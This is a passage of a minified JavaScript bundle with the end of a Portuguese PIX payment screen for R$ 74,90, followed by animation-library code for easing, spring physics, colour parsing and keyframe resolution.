                  }), o ? "Copiado!" : "Copiar Código PIX"]
                })]
              })]
            }), l.jsxs("div", {
              className: "bg-gray-50 p-4 rounded-lg border mb-4",
              children: [l.jsx("h4", {
                className: "font-semibold text-gray-900 mb-2 text-center",
                children: "Como pagar:"
              }), l.jsxs("ol", {
                className: "text-sm text-gray-700 space-y-1",
                children: [l.jsx("li", {
                  children: "1. Abra o aplicativo do seu banco"
                }), l.jsx("li", {
                  children: "2. Acesse a opção PIX"
                }), l.jsx("li", {
                  children: "3. Escaneie o QR Code ou cole o código PIX"
                }), l.jsx("li", {
                  children: "4. Confirme o pagamento de R$ 74,90"
                })]
              })]
            }), t && l.jsx("div", {
              className: "border-t pt-4 text-center",
              children: l.jsxs("p", {
                className: "text-xs text-gray-500",
                children: ["ID da Transação: ", t.transaction_id]
              })
            })]
          })]
        })]
      })
    })]
  })
}

function aj(e) {
  if (typeof Proxy > "u") return e;
  const t = new Map,
    n = (...r) => e(...r);
  return new Proxy(n, {
    get: (r, s) => s === "create" ? e : (t.has(s) || t.set(s, e(s)), t.get(s))
  })
}

function Hl(e) {
  return e !== null && typeof e == "object" && typeof e.start == "function"
}
const ud = e => Array.isArray(e);

function Lx(e, t) {
  if (!Array.isArray(t)) return !1;
  const n = t.length;
  if (n !== e.length) return !1;
  for (let r = 0; r < n; r++)
    if (t[r] !== e[r]) return !1;
  return !0
}

function fi(e) {
  return typeof e == "string" || Array.isArray(e)
}

function yp(e) {
  const t = [{}, {}];
  return e == null || e.values.forEach((n, r) => {
    t[0][r] = n.get(), t[1][r] = n.getVelocity()
  }), t
}

function Bf(e, t, n, r) {
  if (typeof t == "function") {
    const [s, o] = yp(r);
    t = t(n !== void 0 ? n : e.custom, s, o)
  }
  if (typeof t == "string" && (t = e.variants && e.variants[t]), typeof t == "function") {
    const [s, o] = yp(r);
    t = t(n !== void 0 ? n : e.custom, s, o)
  }
  return t
}

function Wl(e, t, n) {
  const r = e.getProps();
  return Bf(r, t, n !== void 0 ? n : r.custom, e)
}
const zf = ["animate", "whileInView", "whileFocus", "whileHover", "whileTap", "whileDrag", "exit"],
  Uf = ["initial", ...zf],
  Ai = ["transformPerspective", "x", "y", "z", "translateX", "translateY", "translateZ", "scale", "scaleX", "scaleY", "rotate", "rotateX", "rotateY", "rotateZ", "skew", "skewX", "skewY"],
  Qr = new Set(Ai),
  An = e => e * 1e3,
  Pn = e => e / 1e3,
  lj = {
    type: "spring",
    stiffness: 500,
    damping: 25,
    restSpeed: 10
  },
  cj = e => ({
    type: "spring",
    stiffness: 550,
    damping: e === 0 ? 2 * Math.sqrt(550) : 30,
    restSpeed: 10
  }),
  uj = {
    type: "keyframes",
    duration: .8
  },
  dj = {
    type: "keyframes",
    ease: [.25, .1, .35, 1],
    duration: .3
  },
  fj = (e, {
    keyframes: t
  }) => t.length > 2 ? uj : Qr.has(e) ? e.startsWith("scale") ? cj(t[1]) : lj : dj;

function $f(e, t) {
  return e ? e[t] || e.default || e : void 0
}
const hj = {
  skipAnimations: !1,
  useManualTiming: !1
},
  mj = e => e !== null;

function Kl(e, {
  repeat: t,
  repeatType: n = "loop"
}, r) {
  const s = e.filter(mj),
    o = t && n !== "loop" && t % 2 === 1 ? 0 : s.length - 1;
  return !o || r === void 0 ? s[o] : r
}
const Ye = e => e;
let dd = Ye;

function pj(e) {
  let t = new Set,
    n = new Set,
    r = !1,
    s = !1;
  const o = new WeakSet;
  let i = {
    delta: 0,
    timestamp: 0,
    isProcessing: !1
  };

  function a(u) {
    o.has(u) && (c.schedule(u), e()), u(i)
  }
  const c = {
    schedule: (u, d = !1, f = !1) => {
      const y = f && r ? t : n;
      return d && o.add(u), y.has(u) || y.add(u), u
    },
    cancel: u => {
      n.delete(u), o.delete(u)
    },
    process: u => {
      if (i = u, r) {
        s = !0;
        return
      }
      r = !0, [t, n] = [n, t], n.clear(), t.forEach(a), r = !1, s && (s = !1, c.process(u))
    }
  };
  return c
}
const aa = ["read", "resolveKeyframes", "update", "preRender", "render", "postRender"],
  gj = 40;

function Ox(e, t) {
  let n = !1,
    r = !0;
  const s = {
    delta: 0,
    timestamp: 0,
    isProcessing: !1
  },
    o = () => n = !0,
    i = aa.reduce((g, p) => (g[p] = pj(o), g), {}),
    {
      read: a,
      resolveKeyframes: c,
      update: u,
      preRender: d,
      render: f,
      postRender: h
    } = i,
    y = () => {
      const g = performance.now();
      n = !1, s.delta = r ? 1e3 / 60 : Math.max(Math.min(g - s.timestamp, gj), 1), s.timestamp = g, s.isProcessing = !0, a.process(s), c.process(s), u.process(s), d.process(s), f.process(s), h.process(s), s.isProcessing = !1, n && t && (r = !1, e(y))
    },
    w = () => {
      n = !0, r = !0, s.isProcessing || e(y)
    };
  return {
    schedule: aa.reduce((g, p) => {
      const m = i[p];
      return g[p] = (b, C = !1, j = !1) => (n || w(), m.schedule(b, C, j)), g
    }, {}),
    cancel: g => {
      for (let p = 0; p < aa.length; p++) i[aa[p]].cancel(g)
    },
    state: s,
    steps: i
  }
}
const {
  schedule: ue,
  cancel: hr,
  state: Fe,
  steps: Kc
} = Ox(typeof requestAnimationFrame < "u" ? requestAnimationFrame : Ye, !0), Fx = (e, t, n) => (((1 - 3 * n + 3 * t) * e + (3 * n - 6 * t)) * e + 3 * t) * e, yj = 1e-7, vj = 12;

function xj(e, t, n, r, s) {
  let o, i, a = 0;
  do i = t + (n - t) / 2, o = Fx(i, r, s) - e, o > 0 ? n = i : t = i; while (Math.abs(o) > yj && ++a < vj);
  return i
}

function Pi(e, t, n, r) {
  if (e === t && n === r) return Ye;
  const s = o => xj(o, 0, 1, e, n);
  return o => o === 0 || o === 1 ? o : Fx(s(o), t, r)
}
const Vx = e => t => t <= .5 ? e(2 * t) / 2 : (2 - e(2 * (1 - t))) / 2,
  Bx = e => t => 1 - e(1 - t),
  zx = Pi(.33, 1.53, .69, .99),
  Hf = Bx(zx),
  Ux = Vx(Hf),
  $x = e => (e *= 2) < 1 ? .5 * Hf(e) : .5 * (2 - Math.pow(2, -10 * (e - 1))),
  Wf = e => 1 - Math.sin(Math.acos(e)),
  Hx = Bx(Wf),
  Wx = Vx(Wf),
  Kx = e => /^0[^.\s]+$/u.test(e);

function wj(e) {
  return typeof e == "number" ? e === 0 : e !== null ? e === "none" || e === "0" || Kx(e) : !0
}
const Qx = e => /^-?(?:\d+(?:\.\d+)?|\.\d+)$/u.test(e),
  Gx = e => t => typeof t == "string" && t.startsWith(e),
  qx = Gx("--"),
  bj = Gx("var(--"),
  Kf = e => bj(e) ? Sj.test(e.split("/*")[0].trim()) : !1,
  Sj = /var\(--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)$/iu,
  Cj = /^var\(--(?:([\w-]+)|([\w-]+), ?([a-zA-Z\d ()%#.,-]+))\)/u;

function Nj(e) {
  const t = Cj.exec(e);
  if (!t) return [,];
  const [, n, r, s] = t;
  return [`--${n ?? r}`, s]
}

function Yx(e, t, n = 1) {
  const [r, s] = Nj(e);
  if (!r) return;
  const o = window.getComputedStyle(t).getPropertyValue(r);
  if (o) {
    const i = o.trim();
    return Qx(i) ? parseFloat(i) : i
  }
  return Kf(s) ? Yx(s, t, n + 1) : s
}
const Mn = (e, t, n) => n > t ? t : n < e ? e : n,
  eo = {
    test: e => typeof e == "number",
    parse: parseFloat,
    transform: e => e
  },
  hi = {
    ...eo,
    transform: e => Mn(0, 1, e)
  },
  la = {
    ...eo,
    default: 1
  },
  Ei = e => ({
    test: t => typeof t == "string" && t.endsWith(e) && t.split(" ").length === 1,
    parse: parseFloat,
    transform: t => `${t}${e}`
  }),
  zn = Ei("deg"),
  an = Ei("%"),
  q = Ei("px"),
  jj = Ei("vh"),
  Aj = Ei("vw"),
  vp = {
    ...an,
    parse: e => an.parse(e) / 100,
    transform: e => an.transform(e * 100)
  },
  Pj = new Set(["width", "height", "top", "left", "right", "bottom", "x", "y", "translateX", "translateY"]),
  xp = e => e === eo || e === q,
  wp = (e, t) => parseFloat(e.split(", ")[t]),
  bp = (e, t) => (n, {
    transform: r
  }) => {
    if (r === "none" || !r) return 0;
    const s = r.match(/^matrix3d\((.+)\)$/u);
    if (s) return wp(s[1], t);
    {
      const o = r.match(/^matrix\((.+)\)$/u);
      return o ? wp(o[1], e) : 0
    }
  },
  Ej = new Set(["x", "y", "z"]),
  Tj = Ai.filter(e => !Ej.has(e));

function kj(e) {
  const t = [];
  return Tj.forEach(n => {
    const r = e.getValue(n);
    r !== void 0 && (t.push([n, r.get()]), r.set(n.startsWith("scale") ? 1 : 0))
  }), t
}
const Ks = {
  width: ({
    x: e
  }, {
    paddingLeft: t = "0",
    paddingRight: n = "0"
  }) => e.max - e.min - parseFloat(t) - parseFloat(n),
  height: ({
    y: e
  }, {
    paddingTop: t = "0",
    paddingBottom: n = "0"
  }) => e.max - e.min - parseFloat(t) - parseFloat(n),
  top: (e, {
    top: t
  }) => parseFloat(t),
  left: (e, {
    left: t
  }) => parseFloat(t),
  bottom: ({
    y: e
  }, {
    top: t
  }) => parseFloat(t) + (e.max - e.min),
  right: ({
    x: e
  }, {
    left: t
  }) => parseFloat(t) + (e.max - e.min),
  x: bp(4, 13),
  y: bp(5, 14)
};
Ks.translateX = Ks.x;
Ks.translateY = Ks.y;
const Xx = e => t => t.test(e),
  Rj = {
    test: e => e === "auto",
    parse: e => e
  },
  Jx = [eo, q, an, zn, Aj, jj, Rj],
  Sp = e => Jx.find(Xx(e)),
  Fr = new Set;
let fd = !1,
  hd = !1;

function Zx() {
  if (hd) {
    const e = Array.from(Fr).filter(r => r.needsMeasurement),
      t = new Set(e.map(r => r.element)),
      n = new Map;
    t.forEach(r => {
      const s = kj(r);
      s.length && (n.set(r, s), r.render())
    }), e.forEach(r => r.measureInitialState()), t.forEach(r => {
      r.render();
      const s = n.get(r);
      s && s.forEach(([o, i]) => {
        var a;
        (a = r.getValue(o)) === null || a === void 0 || a.set(i)
      })
    }), e.forEach(r => r.measureEndState()), e.forEach(r => {
      r.suspendedScrollY !== void 0 && window.scrollTo(0, r.suspendedScrollY)
    })
  }
  hd = !1, fd = !1, Fr.forEach(e => e.complete()), Fr.clear()
}

function e1() {
  Fr.forEach(e => {
    e.readKeyframes(), e.needsMeasurement && (hd = !0)
  })
}

function Dj() {
  e1(), Zx()
}
class Qf {
  constructor(t, n, r, s, o, i = !1) {
    this.isComplete = !1, this.isAsync = !1, this.needsMeasurement = !1, this.isScheduled = !1, this.unresolvedKeyframes = [...t], this.onComplete = n, this.name = r, this.motionValue = s, this.element = o, this.isAsync = i
  }
  scheduleResolve() {
    this.isScheduled = !0, this.isAsync ? (Fr.add(this), fd || (fd = !0, ue.read(e1), ue.resolveKeyframes(Zx))) : (this.readKeyframes(), this.complete())
  }
  readKeyframes() {
    const {
      unresolvedKeyframes: t,
      name: n,
      element: r,
      motionValue: s
    } = this;
    for (let o = 0; o < t.length; o++)
      if (t[o] === null)
        if (o === 0) {
          const i = s == null ? void 0 : s.get(),
            a = t[t.length - 1];
          if (i !== void 0) t[0] = i;
          else if (r && n) {
            const c = r.readValue(n, a);
            c != null && (t[0] = c)
          }
          t[0] === void 0 && (t[0] = a), s && i === void 0 && s.set(t[0])
        } else t[o] = t[o - 1]
  }
  setFinalKeyframe() { }
  measureInitialState() { }
  renderEndStyles() { }
  measureEndState() { }
  complete() {
    this.isComplete = !0, this.onComplete(this.unresolvedKeyframes, this.finalKeyframe), Fr.delete(this)
  }
  cancel() {
    this.isComplete || (this.isScheduled = !1, Fr.delete(this))
  }
  resume() {
    this.isComplete || this.scheduleResolve()
  }
}
const Bo = e => Math.round(e * 1e5) / 1e5,
  Gf = /-?(?:\d+(?:\.\d+)?|\.\d+)/gu;

function Mj(e) {
  return e == null
}
const _j = /^(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))$/iu,
  qf = (e, t) => n => !!(typeof n == "string" && _j.test(n) && n.startsWith(e) || t && !Mj(n) && Object.prototype.hasOwnProperty.call(n, t)),
  t1 = (e, t, n) => r => {
    if (typeof r != "string") return r;
    const [s, o, i, a] = r.match(Gf);
    return {
      [e]: parseFloat(s),
      [t]: parseFloat(o),
      [n]: parseFloat(i),
      alpha: a !== void 0 ? parseFloat(a) : 1
    }
  },
  Ij = e => Mn(0, 255, e),
  Qc = {
    ...eo,
    transform: e => Math.round(Ij(e))
  },
  Rr = {
    test: qf("rgb", "red"),
    parse: t1("red", "green", "blue"),
    transform: ({
      red: e,
      green: t,
      blue: n,
      alpha: r = 1
    }) => "rgba(" + Qc.transform(e) + ", " + Qc.transform(t) + ", " + Qc.transform(n) + ", " + Bo(hi.transform(r)) + ")"
  };

function Lj(e) {
  let t = "",
    n = "",
    r = "",
    s = "";
  return e.length > 5 ? (t = e.substring(1, 3), n = e.substring(3, 5), r = e.substring(5, 7), s = e.substring(7, 9)) : (t = e.substring(1, 2), n = e.substring(2, 3), r = e.substring(3, 4), s = e.substring(4, 5), t += t, n += n, r += r, s += s), {
    red: parseInt(t, 16),
    green: parseInt(n, 16),
    blue: parseInt(r, 16),
    alpha: s ? parseInt(s, 16) / 255 : 1
  }
}
const md = {
  test: qf("#"),
  parse: Lj,
  transform: Rr.transform
},
  hs = {
    test: qf("hsl", "hue"),
    parse: t1("hue", "saturation", "lightness"),
    transform: ({
      hue: e,
      saturation: t,
      lightness: n,
      alpha: r = 1
    }) => "hsla(" + Math.round(e) + ", " + an.transform(Bo(t)) + ", " + an.transform(Bo(n)) + ", " + Bo(hi.transform(r)) + ")"
  },
  Qe = {
    test: e => Rr.test(e) || md.test(e) || hs.test(e),
    parse: e => Rr.test(e) ? Rr.parse(e) : hs.test(e) ? hs.parse(e) : md.parse(e),
    transform: e => typeof e == "string" ? e : e.hasOwnProperty("red") ? Rr.transform(e) : hs.transform(e)
  },
  Oj = /(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))/giu;

function Fj(e) {
  var t, n;
  return isNaN(e) && typeof e == "string" && (((t = e.match(Gf)) === null || t === void 0 ? void 0 : t.length) || 0) + (((n = e.match(Oj)) === null || n === void 0 ? void 0 : n.length) || 0) > 0
}
const n1 = "number",
  r1 = "color",
  Vj = "var",
  Bj = "var(",
  Cp = "${}",
  zj = /var\s*\(\s*--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)|#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\)|-?(?:\d+(?:\.\d+)?|\.\d+)/giu;

function mi(e) {
  const t = e.toString(),
    n = [],
    r = {
      color: [],
      number: [],
      var: []
    },
    s = [];
  let o = 0;
  const a = t.replace(zj, c => (Qe.test(c) ? (r.color.push(o), s.push(r1), n.push(Qe.parse(c))) : c.startsWith(Bj) ? (r.var.push(o), s.push(Vj), n.push(c)) : (r.number.push(o), s.push(n1), n.push(parseFloat(c))), ++o, Cp)).split(Cp);
  return {
    values: n,
    split: a,
    indexes: r,
    types: s
  }
}

function s1(e) {
  return mi(e).values
}

function o1(e) {
  const {
    split: t,
    types: n
  } = mi(e), r = t.length;
  return s => {
    let o = "";
    for (let i = 0; i < r; i++)
      if (o += t[i], s[i] !== void 0) {
        const a = n[i];
        a === n1 ? o += Bo(s[i]) : a === r1 ? o += Qe.transform(s[i]) : o += s[i]
      } return o
  }
}
const Uj = e => typeof e == "number" ? 0 : e;

function $j(e) {
  const t = s1(e);
  return o1(e)(t.map(Uj))
}
const mr = {
  test: Fj,
  parse: s1,
  createTransformer: o1,
  getAnimatableNone: $j
},
  Hj = new Set(["brightness", "contrast", "saturate", "opacity"]);

function Wj(e) {
  const [t, n] = e.slice(0, -1).split("(");
  if (t === "drop-shadow") return e;
  const [r] = n.match(Gf) || [];
  if (!r) return e;
  const s = n.replace(r, "");
  let o = Hj.has(t) ? 1 : 0;
  return r !== n && (o *= 100), t + "(" + o + s + ")"
}
const Kj = /\b([a-z-]*)\(.*?\)/gu,
  pd = {
    ...mr,
    getAnimatableNone: e => {
      const t = e.match(Kj);
      return t ? t.map(Wj).join(" ") : e
    }
  },
  Qj = {
    borderWidth: q,
    borderTopWidth: q,
    borderRightWidth: q,
    borderBottomWidth: q,
    borderLeftWidth: q,
    borderRadius: q,
    radius: q,
    borderTopLeftRadius: q,
    borderTopRightRadius: q,
    borderBottomRightRadius: q,
    borderBottomLeftRadius: q,
    width: q,
    maxWidth: q,
    height: q,
    maxHeight: q,
    top: q,
    right: q,
    bottom: q,
    left: q,
    padding: q,
    paddingTop: q,
    paddingRight: q,
    paddingBottom: q,
    paddingLeft: q,
    margin: q,
    marginTop: q,
    marginRight: q,
    marginBottom: q,
    marginLeft: q,
    backgroundPositionX: q,
    backgroundPositionY: q
  },
  Gj = {
    rotate: zn,
    rotateX: zn,
    rotateY: zn,
    rotateZ: zn,
    scale: la,
    scaleX: la,
    scaleY: la,
    scaleZ: la,
    skew: zn,
    skewX: zn,
    skewY: zn,
    distance: q,
    translateX: q,
    translateY: q,
    translateZ: q,
    x: q,
    y: q,
    z: q,
    perspective: q,
    transformPerspective: q,
    opacity: hi,
    originX: vp,
    originY: vp,
    originZ: q
  },
  Np = {
    ...eo,
    transform: Math.round
  },
  Yf = {
    ...Qj,
    ...Gj,
    zIndex: Np,
    size: q,
    fillOpacity: hi,
    strokeOpacity: hi,
    numOctaves: Np
  },
  qj = {
    ...Yf,
    color: Qe,
    backgroundColor: Qe,
    outlineColor: Qe,
    fill: Qe,
    stroke: Qe,
    borderColor: Qe,
    borderTopColor: Qe,
    borderRightColor: Qe,
    borderBottomColor: Qe,
    borderLeftColor: Qe,
    filter: pd,
    WebkitFilter: pd
  },
  Xf = e => qj[e];

function i1(e, t) {
  let n = Xf(e);
  return n !== pd && (n = mr), n.getAnimatableNone ? n.getAnimatableNone(t) : void 0
}
const Yj = new Set(["auto", "none", "0"]);

function Xj(e, t, n) {
  let r = 0,
    s;
  for (; r < e.length && !s;) {
    const o = e[r];
    typeof o == "string" && !Yj.has(o) && mi(o).values.length && (s = e[r]), r++
  }
  if (s && n)
    for (const o of t) e[o] = i1(n, s)
}
class a1 extends Qf {
  constructor(t, n, r, s, o) {
    super(t, n, r, s, o, !0)
  }
  readKeyframes() {
    const {
      unresolvedKeyframes: t,
      element: n,
      name: r
    } = this;
    if (!n || !n.current) return;
    super.readKeyframes();
    for (let c = 0; c < t.length; c++) {
      let u = t[c];
      if (typeof u == "string" && (u = u.trim(), Kf(u))) {
        const d = Yx(u, n.current);
        d !== void 0 && (t[c] = d), c === t.length - 1 && (this.finalKeyframe = u)
      }
    }
    if (this.resolveNoneKeyframes(), !Pj.has(r) || t.length !== 2) return;
    const [s, o] = t, i = Sp(s), a = Sp(o);
    if (i !== a)
      if (xp(i) && xp(a))
        for (let c = 0; c < t.length; c++) {
          const u = t[c];
          typeof u == "string" && (t[c] = parseFloat(u))
        } else this.needsMeasurement = !0
  }
  resolveNoneKeyframes() {
    const {
      unresolvedKeyframes: t,
      name: n
    } = this, r = [];
    for (let s = 0; s < t.length; s++) wj(t[s]) && r.push(s);
    r.length && Xj(t, r, n)
  }
  measureInitialState() {
    const {
      element: t,
      unresolvedKeyframes: n,
      name: r
    } = this;
    if (!t || !t.current) return;
    r === "height" && (this.suspendedScrollY = window.pageYOffset), this.measuredOrigin = Ks[r](t.measureViewportBox(), window.getComputedStyle(t.current)), n[0] = this.measuredOrigin;
    const s = n[n.length - 1];
    s !== void 0 && t.getValue(r, s).jump(s, !1)
  }
  measureEndState() {
    var t;
    const {
      element: n,
      name: r,
      unresolvedKeyframes: s
    } = this;
    if (!n || !n.current) return;
    const o = n.getValue(r);
    o && o.jump(this.measuredOrigin, !1);
    const i = s.length - 1,
      a = s[i];
    s[i] = Ks[r](n.measureViewportBox(), window.getComputedStyle(n.current)), a !== null && this.finalKeyframe === void 0 && (this.finalKeyframe = a), !((t = this.removedTransforms) === null || t === void 0) && t.length && this.removedTransforms.forEach(([c, u]) => {
      n.getValue(c).set(u)
    }), this.resolveNoneKeyframes()
  }
}

function Jf(e) {
  return typeof e == "function"
}
let Pa;

function Jj() {
  Pa = void 0
}
const ln = {
  now: () => (Pa === void 0 && ln.set(Fe.isProcessing || hj.useManualTiming ? Fe.timestamp : performance.now()), Pa),
  set: e => {
    Pa = e, queueMicrotask(Jj)
  }
},
  jp = (e, t) => t === "zIndex" ? !1 : !!(typeof e == "number" || Array.isArray(e) || typeof e == "string" && (mr.test(e) || e === "0") && !e.startsWith("url("));

function Zj(e) {
  const t = e[0];
  if (e.length === 1) return !0;
  for (let n = 0; n < e.length; n++)
    if (e[n] !== t) return !0
}

function eA(e, t, n, r) {
  const s = e[0];
  if (s === null) return !1;
  if (t === "display" || t === "visibility") return !0;
  const o = e[e.length - 1],
    i = jp(s, t),
    a = jp(o, t);
  return !i || !a ? !1 : Zj(e) || (n === "spring" || Jf(n)) && r
}
const tA = 40;
class l1 {
  constructor({
    autoplay: t = !0,
    delay: n = 0,
    type: r = "keyframes",
    repeat: s = 0,
    repeatDelay: o = 0,
    repeatType: i = "loop",
    ...a
  }) {
    this.isStopped = !1, this.hasAttemptedResolve = !1, this.createdAt = ln.now(), this.options = {
      autoplay: t,
      delay: n,
      type: r,
      repeat: s,
      repeatDelay: o,
      repeatType: i,
      ...a
    }, this.updateFinishedPromise()
  }
  calcStartTime() {
    return this.resolvedAt ? this.resolvedAt - this.createdAt > tA ? this.resolvedAt : this.createdAt : this.createdAt
  }
  get resolved() {
    return !this._resolved && !this.hasAttemptedResolve && Dj(), this._resolved
  }
  onKeyframesResolved(t, n) {
    this.resolvedAt = ln.now(), this.hasAttemptedResolve = !0;
    const {
      name: r,
      type: s,
      velocity: o,
      delay: i,
      onComplete: a,
      onUpdate: c,
      isGenerator: u
    } = this.options;
    if (!u && !eA(t, r, s, o))
      if (i) this.options.duration = 0;
      else {
        c == null || c(Kl(t, this.options, n)), a == null || a(), this.resolveFinishedPromise();
        return
      } const d = this.initPlayback(t, n);
    d !== !1 && (this._resolved = {
      keyframes: t,
      finalKeyframe: n,
      ...d
    }, this.onPostResolved())
  }
  onPostResolved() { }
  then(t, n) {
    return this.currentFinishedPromise.then(t, n)
  }
  flatten() {
    this.options.type = "keyframes", this.options.ease = "linear"
  }
  updateFinishedPromise() {
    this.currentFinishedPromise = new Promise(t => {
      this.resolveFinishedPromise = t
    })
  }
}
const Qs = (e, t, n) => {
  const r = t - e;
  return r === 0 ? 1 : (n - e) / r
},
  c1 = (e, t, n = 10) => {
    let r = "";
    const s = Math.max(Math.round(t / n), 2);
    for (let o = 0; o < s; o++) r += e(Qs(0, s - 1, o)) + ", ";
    return `linear(${r.substring(0, r.length - 2)})`
  };

function u1(e, t) {
  return t ? e * (1e3 / t) : 0
}
const nA = 5;

function d1(e, t, n) {
  const r = Math.max(t - nA, 0);
  return u1(n - e(r), t - r)
}
const Ce = {
  stiffness: 100,
  damping: 10,
  mass: 1,
  velocity: 0,
  duration: 800,
  bounce: .3,
  visualDuration: .3,
  restSpeed: {
    granular: .01,
    default: 2
  },
  restDelta: {
    granular: .005,
    default: .5
  },
  minDuration: .01,
  maxDuration: 10,
  minDamping: .05,
  maxDamping: 1
},
  Gc = .001;

function rA({
  duration: e = Ce.duration,
  bounce: t = Ce.bounce,
  velocity: n = Ce.velocity,
  mass: r = Ce.mass
}) {
  let s, o, i = 1 - t;
  i = Mn(Ce.minDamping, Ce.maxDamping, i), e = Mn(Ce.minDuration, Ce.maxDuration, Pn(e)), i < 1 ? (s = u => {
    const d = u * i,
      f = d * e,
      h = d - n,
      y = gd(u, i),
      w = Math.exp(-f);
    return Gc - h / y * w
  }, o = u => {
    const f = u * i * e,
      h = f * n + n,
      y = Math.pow(i, 2) * Math.pow(u, 2) * e,
      w = Math.exp(-f),
      v = gd(Math.pow(u, 2), i);
    return (-s(u) + Gc > 0 ? -1 : 1) * ((h - y) * w) / v
  }) : (s = u => {
    const d = Math.exp(-u * e),
      f = (u - n) * e + 1;
    return -Gc + d * f
  }, o = u => {
    const d = Math.exp(-u * e),
      f = (n - u) * (e * e);
    return d * f
  });
  const a = 5 / e,
    c = oA(s, o, a);
  if (e = An(e), isNaN(c)) return {
    stiffness: Ce.stiffness,
    damping: Ce.damping,
    duration: e
  };
  {
    const u = Math.pow(c, 2) * r;
    return {
      stiffness: u,
      damping: i * 2 * Math.sqrt(r * u),
      duration: e
    }
  }
}
const sA = 12;

function oA(e, t, n) {
  let r = n;
  for (let s = 1; s < sA; s++) r = r - e(r) / t(r);
  return r
}

function gd(e, t) {
  return e * Math.sqrt(1 - t * t)
}
const yd = 2e4;

function f1(e) {
  let t = 0;
  const n = 50;
  let r = e.next(t);
  for (; !r.done && t < yd;) t += n, r = e.next(t);
  return t >= yd ? 1 / 0 : t
}
const iA = ["duration", "bounce"],
  aA = ["stiffness", "damping", "mass"];

function Ap(e, t) {
  return t.some(n => e[n] !== void 0)
}

function lA(e) {
  let t = {
    velocity: Ce.velocity,
    stiffness: Ce.stiffness,
    damping: Ce.damping,
    mass: Ce.mass,
    isResolvedFromDuration: !1,
    ...e
  };
  if (!Ap(e, aA) && Ap(e, iA))
    if (e.visualDuration) {
      const n = e.visualDuration,
        r = 2 * Math.PI / (n * 1.2),
        s = r * r,
        o = 2 * Mn(.05, 1, 1 - e.bounce) * Math.sqrt(s);
      t = {
        ...t,
        mass: Ce.mass,
        stiffness: s,
        damping: o
      }
    } else {
      const n = rA(e);
      t = {
        ...t,
        ...n,
        mass: Ce.mass
      }, t.isResolvedFromDuration = !0
    } return t
}

function h1(e = Ce.visualDuration, t = Ce.bounce) {
  const n = typeof e != "object" ? {
    visualDuration: e,
    keyframes: [0, 1],
    bounce: t
  } : e;
  let {
    restSpeed: r,
    restDelta: s
  } = n;
  const o = n.keyframes[0],
    i = n.keyframes[n.keyframes.length - 1],
    a = {
      done: !1,
      value: o
    },
    {
      stiffness: c,
      damping: u,
      mass: d,
      duration: f,
      velocity: h,
      isResolvedFromDuration: y
    } = lA({
      ...n,
      velocity: -Pn(n.velocity || 0)
    }),
    w = h || 0,
    v = u / (2 * Math.sqrt(c * d)),
    S = i - o,
    g = Pn(Math.sqrt(c / d)),
    p = Math.abs(S) < 5;
  r || (r = p ? Ce.restSpeed.granular : Ce.restSpeed.default), s || (s = p ? Ce.restDelta.granular : Ce.restDelta.default);
  let m;
  if (v < 1) {
    const C = gd(g, v);
    m = j => {
      const A = Math.exp(-v * g * j);
      return i - A * ((w + v * g * S) / C * Math.sin(C * j) + S * Math.cos(C * j))
    }
  } else if (v === 1) m = C => i - Math.exp(-g * C) * (S + (w + g * S) * C);
  else {
    const C = g * Math.sqrt(v * v - 1);
    m = j => {
      const A = Math.exp(-v * g * j),
        P = Math.min(C * j, 300);
      return i - A * ((w + v * g * S) * Math.sinh(P) + C * S * Math.cosh(P)) / C
    }
  }
  const b = {
    calculatedDuration: y && f || null,
    next: C => {
      const j = m(C);
      if (y) a.done = C >= f;
      else {
        let A = 0;
        v < 1 && (A = C === 0 ? An(w) : d1(m, C, j));
        const P = Math.abs(A) <= r,
          M = Math.abs(i - j) <= s;
        a.done = P && M
      }
      return a.value = a.done ? i : j, a
    },
    toString: () => {
      const C = Math.min(f1(b), yd),
        j = c1(A => b.next(C * A).value, C, 30);
      return C + "ms " + j
    }
  };
  return b
}

function Pp({
  keyframes: e,
  velocity: t = 0,
  power: n = .8,
  timeConstant: r = 325,
  bounceDamping: s = 10,
  bounceStiffness: o = 500,
  modifyTarget: i,
  min: a,
  max: c,
  restDelta: u = .5,
  restSpeed: d
}) {
  const f = e[0],
    h = {
      done: !1,
      value: f
    },
    y = P => a !== void 0 && P < a || c !== void 0 && P > c,
    w = P => a === void 0 ? c : c === void 0 || Math.abs(a - P) < Math.abs(c - P) ? a : c;
  let v = n * t;
  const S = f + v,
    g = i === void 0 ? S : i(S);
  g !== S && (v = g - f);
  const p = P => -v * Math.exp(-P / r),
    m = P => g + p(P),
    b = P => {
      const M = p(P),
        _ = m(P);
      h.done = Math.abs(M) <= u, h.value = h.done ? g : _
    };
  let C, j;
  const A = P => {
    y(h.value) && (C = P, j = h1({
      keyframes: [h.value, w(h.value)],
      velocity: d1(m, P, h.value),
      damping: s,
      stiffness: o,
      restDelta: u,
      restSpeed: d
    }))
  };
  return A(0), {
    calculatedDuration: null,
    next: P => {
      let M = !1;
      return !j && C === void 0 && (M = !0, b(P), A(P)), C !== void 0 && P >= C ? j.next(P - C) : (!M && b(P), h)
    }
  }
}
const cA = Pi(.42, 0, 1, 1),
  uA = Pi(0, 0, .58, 1),
  m1 = Pi(.42, 0, .58, 1),
  dA = e => Array.isArray(e) && typeof e[0] != "number",
  Zf = e => Array.isArray(e) && typeof e[0] == "number",
  Ep = {
    linear: Ye,
    easeIn: cA,
    easeInOut: m1,
    easeOut: uA,
    circIn: Wf,
    circInOut: Wx,
    circOut: Hx,
    backIn: Hf,
    backInOut: Ux,
    backOut: zx,
    anticipate: $x
  },
  Tp = e => {
    if (Zf(e)) {
      dd(e.length === 4);
      const [t, n, r, s] = e;
      return Pi(t, n, r, s)
    } else if (typeof e == "string") return dd(Ep[e] !== void 0), Ep[e];
    return e
  },
  fA = (e, t) => n => t(e(n)),
  cr = (...e) => e.reduce(fA),
